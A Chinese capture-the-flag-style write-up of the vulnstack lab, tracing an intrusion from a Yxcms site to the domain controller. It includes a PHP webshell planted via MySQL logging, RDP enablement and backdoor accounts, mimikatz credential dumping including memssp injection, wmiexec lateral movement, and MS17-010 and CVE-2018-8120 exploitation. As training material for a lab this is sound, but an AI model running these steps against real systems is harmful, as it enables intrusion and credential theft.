> 原文链接: https://www.anquanke.com//post/id/189940 


# 从外网到域控（vulnstack靶机实战）


                                阅读量   
                                **1355960**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">16</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01b1ecef973b4c4fc7.jpg)](https://p4.ssl.qhimg.com/t01b1ecef973b4c4fc7.jpg)



## 前言

vlunstack是红日安全团队出品的一个实战环境，具体介绍请访问：[http://vulnstack.qiyuanxuetang.net/vuln/detail/2/](http://vulnstack.qiyuanxuetang.net/vuln/detail/2/)

拓扑结构大体如下：

[![](https://p2.ssl.qhimg.com/t018915c37beca70abc.png)](https://p2.ssl.qhimg.com/t018915c37beca70abc.png)

话不多说，直接开搞..



## 外网初探

打开页面后发现是一个Yxcms的站点，关于Yxcms的漏洞可以参考：[https://www.freebuf.com/column/162886.html](https://www.freebuf.com/column/162886.html)

[![](https://p0.ssl.qhimg.com/t01601e5ad4c2799a84.png)](https://p0.ssl.qhimg.com/t01601e5ad4c2799a84.png)

然后找到后台，随手一个弱口令：admin、123456便进入了后台（实战中也有很多的站点是弱口令，只能说千里之堤溃于蚁穴）

[![](https://p2.ssl.qhimg.com/t01c463f3d73a2a1076.png)](https://p2.ssl.qhimg.com/t01c463f3d73a2a1076.png)

关于Yx后台拿shell的方法还是很简单的，直接在新建模板哪里，将我们的一句话木马添加进去就ok了

比如这样

[![](https://p5.ssl.qhimg.com/t0181e0c0e4ae09fc46.png)](https://p5.ssl.qhimg.com/t0181e0c0e4ae09fc46.png)

此时我们连接index.php即可获得shell

[![](https://p3.ssl.qhimg.com/t0189891ea9e9e05478.png)](https://p3.ssl.qhimg.com/t0189891ea9e9e05478.png)

此时呢，我们先不往下进行，既然是靶机，我们就应该多去尝试一下发掘它其他的漏洞，蚁剑连接以后可以发现这是一个phpstudy搭建的网站，那么按照经验我们知道应该会有默认的phpmyadmin在，我们尝试访问：

[![](https://p5.ssl.qhimg.com/t014b2c259795817f84.png)](https://p5.ssl.qhimg.com/t014b2c259795817f84.png)

发现猜测的没错，那么默认密码呢，root、root发现竟然也进去了，那么就来复习一下phpmyadmin后台getshell吧。phpmyadmin后台getshell一般有以下几种方式：

1、select into outfile直接写入<br>
2、开启全局日志getshell<br>
3、使用慢查询日志getsehll<br>
4、使用错误日志getshell<br>
5、利用phpmyadmin4.8.x本地文件包含漏洞getshell

我们先来看一下第一种，直接写shell

[![](https://p4.ssl.qhimg.com/t01f8b1833563616323.png)](https://p4.ssl.qhimg.com/t01f8b1833563616323.png)

发现是不行的，而且该变量为只读，所以只能放弃。

再来看一下第二种，利用全局变量general_log去getshell

[![](https://p4.ssl.qhimg.com/t01e8ab3e35bfbd0722.png)](https://p4.ssl.qhimg.com/t01e8ab3e35bfbd0722.png)

我们尝试更改日志状态、位置

```
set global general_log=on;# 开启日志

set global general_log_file='C:/phpstudy/www/yxcms/v01cano.php';# 设置日志位置为网站目录
```

发现已经成功更改

[![](https://p2.ssl.qhimg.com/t01458dcf047fe4f237.png)](https://p2.ssl.qhimg.com/t01458dcf047fe4f237.png)

此时执行如下语句即可getshell

```
select '&lt;?php assert($_POST["a"]); ?&gt;'
```

剩下的就不再去测试了，大家有兴趣的可以去自行尝试

拿到shell之后我们就该提权了



## 杀入内网

[![](https://p1.ssl.qhimg.com/t01b081092a040254ee.png)](https://p1.ssl.qhimg.com/t01b081092a040254ee.png)

发现是一个administrator权限的shell，然后查看3389是否开启

[![](https://p1.ssl.qhimg.com/t015214f9d6a8b56285.png)](https://p1.ssl.qhimg.com/t015214f9d6a8b56285.png)

发现3389并没有开启，我们使用以下命令开启它：

```
REG ADD HKLMSYSTEMCurrentControlSetControlTerminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

然后就发现3389已经成功的开启了

[![](https://p5.ssl.qhimg.com/t01cdb9d09a7841f383.png)](https://p5.ssl.qhimg.com/t01cdb9d09a7841f383.png)

尝试添加用户：

```
C:\phpStudy\WWW\yxcms&gt; net user test N0hWI!@! /add
命令成功完成。
C:\phpStudy\WWW\yxcms&gt; net localgroup administrators test /add
命令成功完成。
```

可以发现已经成功添加一个用户上去

[![](https://p2.ssl.qhimg.com/t01fbcbab39abde39ad.png)](https://p2.ssl.qhimg.com/t01fbcbab39abde39ad.png)

尝试远程桌面连接却失败了，nmap扫描3389端口发现状态为filtered

[![](https://p1.ssl.qhimg.com/t01113439bcfb456ba7.png)](https://p1.ssl.qhimg.com/t01113439bcfb456ba7.png)

猜测应该是防火墙的问题，查看虚拟机发现猜测没错

[![](https://p0.ssl.qhimg.com/t018f75694bc6bd5d1d.png)](https://p0.ssl.qhimg.com/t018f75694bc6bd5d1d.png)

此时思路一般如下：

1、反弹一个msf的shell回来，尝试关闭防火墙<br>
2、尝试使用隧道连接3389

我们先来看一下第二种我们这里使用ngrok：

在ngrok中添加一条tcp隧道就ok然后了，然后我们就可以去连接目标的3389了

[![](https://p4.ssl.qhimg.com/t01579374e5c2a0a59c.png)](https://p4.ssl.qhimg.com/t01579374e5c2a0a59c.png)

我们再来看一下第一种的操作，先反弹一个msf的shell回来

[![](https://p3.ssl.qhimg.com/t015472c31f1e076a26.png)](https://p3.ssl.qhimg.com/t015472c31f1e076a26.png)

关闭防火墙：

```
meterpreter &gt;  run post/windows/manage/enable_rdp
```

[![](https://p3.ssl.qhimg.com/t01a2063579e37c979c.png)](https://p3.ssl.qhimg.com/t01a2063579e37c979c.png)

此时我们便可以直接连接目标主机了

[![](https://p4.ssl.qhimg.com/t01abfebb2ef857deb5.png)](https://p4.ssl.qhimg.com/t01abfebb2ef857deb5.png)

下面我们就该去杀入域控了，杀入域之前我们先来做一些基础的信息收集，毕竟大佬说过渗透测试的本质是信息收集..

```
ipconfig /all    查询本机IP段，所在域等
net config Workstation    当前计算机名，全名，用户名，系统版本，工作站域，登陆域
net user    本机用户列表
net localhroup administrators    本机管理员[通常含有域用户]
net user /domain    查询域用户
net user 用户名 /domain    获取指定用户的账户信息
net user /domain b404 pass    修改域内用户密码，需要管理员权限
net group /domain    查询域里面的工作组
net group 组名 /domain    查询域中的某工作组
net group "domain admins" /domain    查询域管理员列表
net group "domain controllers" /domain    查看域控制器(如果有多台)
net time /domain    判断主域，主域服务器都做时间服务器
ipconfig /all    查询本机IP段，所在域等
```

经过一番信息收集，我们可以知道域控的地址为：192.168.52.138、域成员主机03地址：192.168.52.141

然后抓一下本地管理员的密码：

首先使用getsystem进行提权

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t019a51d86a1d56b5b1.png)

我们此时已经获取了system权限（实战中可能需要其他更复杂的方式进行提权）

然后抓一下hash

发现失败了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0147b1760fce7d46d7.png)

然后我们用msf自带的模块进行hash抓取

```
meterpreter &gt; run post/windows/gather/smart_hashdump
```

发现已经获取了hash

[![](https://p5.ssl.qhimg.com/t01bff044cbbb3249b0.png)](https://p5.ssl.qhimg.com/t01bff044cbbb3249b0.png)

但是这样获取的hash不是很全面，我们再使用mimitakz进行抓取

```
meterpreter &gt; mimikatz_command -f samdump::hashes
```

[![](https://p5.ssl.qhimg.com/t01fc5fd55c12773877.png)](https://p5.ssl.qhimg.com/t01fc5fd55c12773877.png)

在本环境中我们是没有办法直接抓取明文的，当然也有办法绕过就是自己上传一个mimitakz使用debug进行明文抓取

我们先把mimitakz（实战中需要免杀处理）上传上去：

[![](https://p5.ssl.qhimg.com/t01ca5a3d8f154cb8df.png)](https://p5.ssl.qhimg.com/t01ca5a3d8f154cb8df.png)

然后进行明文密码抓取

[![](https://p0.ssl.qhimg.com/t01c4d317e213d229a2.png)](https://p0.ssl.qhimg.com/t01c4d317e213d229a2.png)

先进行权限提升

```
privilege：：debug
```

然后使用

```
sekurlsa：：logonPasswords
```

进行明文抓取

[![](https://p5.ssl.qhimg.com/t01524de5f946694b6f.png)](https://p5.ssl.qhimg.com/t01524de5f946694b6f.png)

此时我们就已经获取到了administrator的明文密码

我们再对03进行渗透



## 内网漫游

先添加一条路由进来：

```
meterpreter &gt; run autoroute -s 192.168.52.0/24
```

[![](https://p4.ssl.qhimg.com/t010a1830e13a5eed4d.png)](https://p4.ssl.qhimg.com/t010a1830e13a5eed4d.png)

我们使用作者给出的漏洞列表进行尝试

[![](https://p2.ssl.qhimg.com/t0165052491af946555.png)](https://p2.ssl.qhimg.com/t0165052491af946555.png)

然后使用08-067（[https://www.freebuf.com/vuls/203881.html）](https://www.freebuf.com/vuls/203881.html%EF%BC%89) 进行渗透，发现失败了..

[![](https://p2.ssl.qhimg.com/t01ea9d7a2fa5e6b2af.png)](https://p2.ssl.qhimg.com/t01ea9d7a2fa5e6b2af.png)

对另外的漏洞也进行了测试<br>
后来发现都还是失败了…额，后来查看发现是目标主机这些服务默认没有开启，需要手工开启…

算了直接使用ms17-010打一个shell回来，这里要注意一下，msf内置的17-010打2003有时候多次执行后msf就接收不到session，而且ms17-010利用时，脆弱的server 2003非常容易蓝屏。<br>
本人也尝试了一下github上的windows 2003 – windows 10全版本的msf 17-010脚本，但效果都是一般..这里也给出脚本名称，大家可以自己去找一下..（ms17_010_eternalblue_doublepulsar）

这里的话呢，先给大家说一下思路，首先机器为域内主机，不通外网我们不能直接使用17-010来打，可以先使用msf的socks功能做一个代理出来，这样我们便可以使用nmap等对其进行简单的信息判断

像这样（-PN、-sT必须加）：

```
proxychains nmap -p 3389 -Pn -sT 192.168.52.141
```

[![](https://p4.ssl.qhimg.com/t01095a6cb59487e451.png)](https://p4.ssl.qhimg.com/t01095a6cb59487e451.png)

而且使用msf的代理之后就不能使用反向shell了，我们需要使用正向shell，然后我们可以先使用auxiliary/admin/smb/ms17_010_command来执行一些命令

[![](https://p3.ssl.qhimg.com/t01252161a211515060.png)](https://p3.ssl.qhimg.com/t01252161a211515060.png)

然后这时候如果你的权限是system，你可以添加一个用户，然后使用exploit/windows/smb/ms17_010_psexec 尝试去打一个shell回来，因为这个模块需要你去指定一个管理员用户….但是我这里依然失败了，于是我便添加了一个用户上去，直接使用远程桌面连接上了2003的机器…

[![](https://p2.ssl.qhimg.com/t01de09f99a7f4ed24f.png)](https://p2.ssl.qhimg.com/t01de09f99a7f4ed24f.png)

然后传了一个msf的正向shell，使用msf接收到了2003的shell

[![](https://p1.ssl.qhimg.com/t01b925edf69a01ac3f.png)](https://p1.ssl.qhimg.com/t01b925edf69a01ac3f.png)

因为是2003的机器，直接getsystem便得到了system权限

[![](https://p3.ssl.qhimg.com/t01ebdce6ae9236a58b.png)](https://p3.ssl.qhimg.com/t01ebdce6ae9236a58b.png)

然后用之前相同的方法便可以得到管理员的明文密码..

这里顺便说一下，除了上面的那种方法可以得到shell，也可以添加用户和使用regeorg+proxifier进入内网连接，然后用netsh中转得到session

至此2003的渗透基本就到此为止了，我们下面来怼域控！！！

其实在前面我们已经拿到了域用户的帐号密码，即administrator、hongrisec[@2019](https://github.com/2019)我们现在要做的就是如何登录到域控上去

我们这里的话呢使用wmi进行操作

上传wmi到192.168.52.143（win7）这个机器上去，然后执行：

```
C:UsersAdministratorDesktop&gt;cscript.exe wmiexec.vbs /cmd 192.168.52.138 admin
istrator hongrisec@2019 "whoami"
```

得到回显

[![](https://p5.ssl.qhimg.com/t012fecccee1d75872d.png)](https://p5.ssl.qhimg.com/t012fecccee1d75872d.png)

然后通过相同的方式下载一个msf的木马，反弹一个shell回来（正向）

得到shell

[![](https://p0.ssl.qhimg.com/t013a97ea83e578b4b9.png)](https://p0.ssl.qhimg.com/t013a97ea83e578b4b9.png)

这里很好奇的是，为了增加难度，我在域控上加了一个安全狗上去，但是在我执行msf的shell的时候并没有提示任何异常操作..

[![](https://p3.ssl.qhimg.com/t011f52eafd784b6e90.png)](https://p3.ssl.qhimg.com/t011f52eafd784b6e90.png)

算了，不管他..继续，提权域控，导出域hash<br>
先查看有那些补丁没有打..

```
run post/windows/gather/enum_patches
```

[![](https://p5.ssl.qhimg.com/t01307764c848aa4a71.png)](https://p5.ssl.qhimg.com/t01307764c848aa4a71.png)

尝试了几个exp之后都失败了，于是寄出神器CVE-2018-8120

[![](https://p3.ssl.qhimg.com/t0143723f916a25991a.png)](https://p3.ssl.qhimg.com/t0143723f916a25991a.png)

得到system权限，然后下面我们尝试去抓取域控上面的hash与明文密码..

我们这里使用直接上传mimikatz的方法进行抓取，这时候，终于安全狗报毒了…

我们换上免杀的mimikatz进行密码抓取

[![](https://p1.ssl.qhimg.com/t0150fae6f6dbee12a3.png)](https://p1.ssl.qhimg.com/t0150fae6f6dbee12a3.png)

但这只是我们当前用户的密码，我们需要一个域管理的密码..<br>
我们可以做如下操作：

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # misc::memssp
Injected =)

mimikatz # exit
```

此时我们只需要耐心等待域管理员登录就好了，我们模拟登录后再进行查看.

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01580ae4d73d75dc78.png)

已经获得了域管理员的明文密码



## 写在后面

整个过程下来收获还是蛮大的，也意识到了自己的不足，当然我的这种方法可能不是最好的方法，而且作者也说了在域控上有redis漏洞等，文中都没有涉及，而且实战中肯定也会比这个复杂的多，本文也仅仅是给大家提供一个思路而已，如果文中有出错的地方还望指出，以免误人子弟。
